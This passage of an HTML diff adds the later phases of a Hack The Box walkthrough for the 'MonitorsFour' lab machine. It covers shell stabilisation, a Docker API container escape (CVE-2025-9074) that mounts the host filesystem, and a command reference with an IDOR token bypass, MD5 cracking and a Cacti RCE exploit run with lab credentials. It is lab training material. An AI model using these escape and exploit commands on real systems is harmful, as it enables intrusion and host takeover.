+<span class="terminal-prompt">#</span> Check if we're in a container
+ls -la /.dockerenv
+cat /proc/1/cgroup | grep docker
+hostname
+
+<span class="terminal-prompt">#</span> Check the kernel (reveals WSL2)
+uname -a
+<span class="terminal-prompt">#</span> Linux 6.6.87.2-microsoft-standard-WSL2</pre>
+
+        <h3>7.2 Stabilize the Shell</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Spawn a proper TTY
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+<span class="terminal-prompt">#</span> Ctrl+Z, then: stty raw -echo; fg</pre>
+    </section>
+
+    <section id="phase8">
+        <div class="section-num">/ PHASE 8 / DOCKER ESCAPE</div>
+        <h2>CVE-2025-9074: Breaking Out to Windows</h2>
+
+        <h3>8.1 Discover the Docker API</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Check resolv.conf for the Docker host IP
+cat /etc/resolv.conf
+<span class="terminal-prompt">#</span> nameserver 192.168.65.7
+
+<span class="terminal-prompt">#</span> Test Docker API access
+curl http://192.168.65.7:2375/version</pre>
+
+        <h3>8.2 Create Container for Escape</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Create JSON config that mounts host root
+cat > escape.json << 'EOF'
+{
+  "Image": "docker_setup-nginx-php:latest",
+  "Cmd": ["/bin/sh", "-c", "cat /host_root/mnt/host/c/Users/Administrator/Desktop/root.txt"],
+  "HostConfig": {
+    "Binds": ["/:/host_root"]
+  }
+}
+EOF</pre>
+
+        <h3>8.3 Create and Run the Container</h3>
+        <pre>
+<span class="terminal-prompt">#</span> Create container
+curl -H 'Content-Type: application/json' -d @escape.json \
+  "http://192.168.65.7:2375/containers/create" -o response.json
+
+<span class="terminal-prompt">#</span> Extract container ID
+cid=$(grep -o '"Id":"[^"]*"' response.json | cut -d'"' -f4)
+
+<span class="terminal-prompt">#</span> Start container
+curl -X POST "http://192.168.65.7:2375/containers/$cid/start"
+
+<span class="terminal-prompt">#</span> Check logs for root flag
+curl "http://192.168.65.7:2375/containers/$cid/logs?stdout=1"</pre>
+    </section>
+
+    <section id="phase9">
+        <div class="section-num">/ PHASE 9 / CAPTURE THE FLAGS</div>
+        <h2>User.txt and Root.txt</h2>
+
+        <div class="two-column">
+            <div>
+                <h3>User Flag (Linux Container)</h3>
+                <pre>
+cat /home/marcus/user.txt</pre>
+            </div>
+            <div>
+                <h3>Root Flag (Windows Host)</h3>
+                <pre>
+cat /host_root/mnt/host/c/Users/Administrator/Desktop/root.txt</pre>
+            </div>
+        </div>
+    </section>
+
+    <section id="reference">
+        <div class="section-num">/ REFERENCE</div>
+        <h2>Complete Command Reference</h2>
+
+        <div class="command-grid">
+            <div class="command-card">
+                <code>sudo openvpn your-username.ovpn</code>
+                <div class="command-desc">Connect to HTB VPN</div>
+            </div>
+            <div class="command-card">
+                <code>echo "10.129.10.81 monitorsfour.htb" | sudo tee -a /etc/hosts</code>
+                <div class="command-desc">Add domain to hosts</div>
+            </div>
+            <div class="command-card">
+                <code>nmap -sC -sV -oA monitorsfour 10.129.10.81</code>
+                <div class="command-desc">Comprehensive scan</div>
+            </div>
+            <div class="command-card">
+                <code>whatweb http://monitorsfour.htb</code>
+                <div class="command-desc">Technology fingerprinting</div>
+            </div>
+            <div class="command-card">
+                <code>ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt</code>
+                <div class="command-desc">Directory fuzzing</div>
+            </div>
+            <div class="command-card">
+                <code>curl "http://monitorsfour.htb/user?token=0" | jq .</code>
+                <div class="command-desc">IDOR exploit</div>
+            </div>
+            <div class="command-card">
+                <code>john --format=raw-md5 admin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code>
+                <div class="command-desc">Crack MD5 hash</div>
+            </div>
+            <div class="command-card">
+                <code>ffuf -H "Host: FUZZ.monitorsfour.htb" -u http://10.129.10.81 -w subdomains.txt -fs 138</code>
+                <div class="command-desc">Subdomain fuzzing</div>
+            </div>
+            <div class="command-card">
+                <code>sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i 10.10.14.130 -l 9001</code>
+                <div class="command-desc">Run Cacti RCE</div>
+            </div>
+            <div class="command-card">
+                <code>curl http://192.168.65.7:2375/version</code>
+                <div class="command-desc">Test Docker API</div>
+            </div>
+        </div>
+    </section>
+
+    <section id="troubleshooting">
+        <div class="section-num">/ TROUBLESHOOTING</div>
+        <h2>Error Resolution Matrix</h2>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Error Message</th>
+                        <th>Likely Cause</th>
+                        <th>Solution</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>Failed to connect to server</code></td>
+                        <td>VPN disconnected or machine IP changed</td>
+                        <td>Check VPN: <code>ip a | grep tun0</code>. Update hosts with new IP.</td>
+                    </tr>
+                    <tr>
+                        <td><code>405 Method Not Allowed</code></td>
+                        <td>Using HEAD request on endpoint that doesn't support it</td>
+                        <td>Normal for some endpoints - try GET with <code>curl</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>{"error":"Missing token parameter"}</code></td>
+                        <td>No token provided</td>
+                        <td>Add <code>?token=0</code> to bypass</td>
+                    </tr>
+                    <tr>
+                        <td><code>Connection refused</code> to 192.168.65.7:2375</td>
+                        <td>Not in container or Docker API not exposed</td>
+                        <td>Verify you're in container: <code>ls /.dockerenv</code></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ APPENDIX</div>
+        <h2>Vulnerability Deep Dive</h2>
+
+        <h3>PHP Type Juggling (IDOR)</h3>
+        <p><strong>Affected:</strong> Loose comparison (<code>==</code>) vs strict (<code>===</code>)<br>
+        <strong>Example:</strong> <code>0 == null</code> → <code>true</code><br>
+        <strong>Detection:</strong> WhatWeb showed PHP/8.3.27 - vulnerable to this</p>
+
+        <h3>CVE-2025-24367: Cacti RCE</h3>
+        <p><strong>Affected:</strong> Cacti ≤ 1.2.28<br>
+        <strong>Vector:</strong> Authenticated users can inject PHP via <code>right_axis_label</code></p>
+
+        <h3>CVE-2025-9074: Docker API Exposure</h3>
+        <p><strong>Affected:</strong> Docker Desktop on WSL2<br>
+        <strong>Vector:</strong> Docker API exposed on <code>192.168.65.7:2375</code> with no auth</p>
+    </section>
+
+    <div class="flag-box">
+        <span class="flag-label">ROOM COMPLETION</span>
+        <div class="flag-text" style="font-size: 1.2rem;">
+            ✅ IDOR (token=0) ✓<br>
+            ✅ Hash Cracking (wonderful1) ✓<br>
+            ✅ Subdomain Discovery (cacti) ✓<br>
+            ✅ Cacti RCE (CVE-2025-24367) ✓<br>
+            ✅ Docker Escape (CVE-2025-9074) ✓<br>
+            ✅ User Flag Captured ✓<br>
+            ✅ Root Flag Captured ✓
+        </div>
+    </div>
+
+    <footer>
+        &copy; 2026 // CYB3R3LLA // MONITORSFOUR COMPLETE TECHNICAL REFERENCE<br>
+        Target: 10.129.10.81 // Domains: monitorsfour.htb, cacti.monitorsfour.htb<br>
+        CVEs: CVE-2025-24367, CVE-2025-9074 // Last Updated: March 2026
+    </footer>
+</div>
+
+</body>
+</html>
